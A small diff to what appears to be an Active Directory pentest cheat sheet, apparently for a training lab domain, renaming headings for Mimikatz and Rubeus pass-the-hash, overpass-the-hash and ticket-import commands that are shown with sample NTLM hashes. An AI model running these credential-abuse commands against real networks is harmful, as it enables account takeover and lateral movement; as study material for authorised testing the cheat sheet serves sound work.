@@ -273,13 +273,13 @@ If functions not on remote host:-
 
 * * *
 
-#### Mimikatz Pass-the-hash
+#### Mimikatz OverPass-the-hash
 ```Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"' ```
 
-#### Mimikatz Pass-the-ticket
+#### Mimikatz Import Ticket
 ```Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000- Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'```
 
-#### Rubeus Pass-the-ticket
+#### Rubeus OverPass/Pass-the-key
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
 ```Rubeus.exe asktgt /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /ptt```
